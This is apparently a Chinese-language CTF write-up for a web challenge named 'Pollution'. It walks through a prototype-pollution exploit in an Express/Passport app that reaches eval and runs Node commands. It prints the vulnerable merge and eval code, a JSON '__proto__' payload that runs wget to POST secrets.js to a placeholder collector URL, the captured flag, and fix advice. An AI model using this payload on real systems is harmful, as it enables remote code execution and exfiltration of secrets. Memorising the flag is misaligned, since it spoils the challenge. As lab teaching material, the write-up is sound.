# Pollution

## 题目简述

这是一个 Express、Passport 与 hjs 的用户站点。公开的 `/upload/users` 接收 JSON 用户数组，并会把导入项递归合并到已有用户对象。登录一个不存在的用户名时，Passport 会读取全局 `options.userAutoCreateTemplate`，将它插入 template literal 后执行 `eval`。两处机制组合成从 prototype pollution 到 Node.js 命令执行的链。

运行时会把真实 flag 写入 `/app/secrets.js`，因此只需让 Node 进程读取该文件，并用受控的出站 HTTP POST 外带文件内容。原型污染是决定性漏洞，命令执行只是受污染选项进入 `eval` 后的结果，故归类为 Web。

## 解题过程

### 用用户导入污染 Object.prototype

导入路由对 JSON 对象使用自定义深合并：

```js
function merge(target, source) {
  Object.keys(source).forEach((key) => {
    if (isObject(source[key])) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  });
  return target;
}
```

`JSON.parse` 得到的 `"__proto__"` 是可枚举自有键。处理该键时，`target["__proto__"]` 取到 `Object.prototype`，递归 merge 便把 payload 的字段写到全局原型。路由没有鉴权要求；注册一个普通账号只是为了让导入项的 `lcUsername` 能匹配已有用户，避免改变不必要的字段。

上传一个仅含单个更新项的 JSON：

```json
[
  {
    "lcUsername": "test",
    "__proto__": {
      "userAutoCreateTemplate": "${require('child_process').exec('wget --post-data \"$(cat secrets.js)\" COLLECTOR_URL')}"
    }
  }
]
```

将 `COLLECTOR_URL` 替换为自己可查看请求正文的收集端点；它不是题目依赖，唯一目的只是接收经 HTTP POST 外带的文件内容。上传字段名必须是 multipart 的 `upload-users`。

### 以未注册用户名触发 eval

登录策略在找不到用户时检查全局选项，而 `options` 自己并没有定义 `userAutoCreateTemplate`。污染后的原型属性却会被普通属性访问命中：

```js
if (options.userAutoCreateTemplate) {
  const wrapperFunction = `(function() {
    const username = '${username}';
    const passport = '${password}';
    return \`${options.userAutoCreateTemplate}\`;
  })()`;
  const newUser = JSON.parse(eval(wrapperFunction));
}
```

随后 POST `/login`，使用任意不存在的用户名和密码。模板字面量在 `eval` 中插值，`${require('child_process').exec(...)}` 立即由 Node 执行；`wget --post-data "$(cat secrets.js)" ...` 读取当前工作目录 `/app` 的 `secrets.js`，并将内容发往收集端。

收集到的 JavaScript 中含有运行时替换后的 flag：

```text
grey{Pr07otYp3_p01Lut1oN_i5_b4D_f0R_7He_3NV_UUID}
```

这一步用不存在的用户而非正常账号登录很重要：只有 `findOne` 未命中才会进入自动创建分支。

## 方法总结

- 核心技巧：未过滤 `__proto__` 的递归合并污染 `Object.prototype`，让本不在配置对象中的选项变为真值。
- 识别信号：用户可控 JSON 被深合并；合并逻辑直接读取 `target[key]`；下游代码以普通属性访问读取全局配置，并把属性放入 `eval`、模板编译或命令构造。
- 复用要点：先确认污染键能到达原型而非只是成为普通数据字段，再寻找跨请求读取同名属性的 gadget。修复应拒绝 `__proto__`、`constructor`、`prototype`，并以无原型字典承载配置；仅在某个路由加鉴权不能消除已存在的污染 gadget。
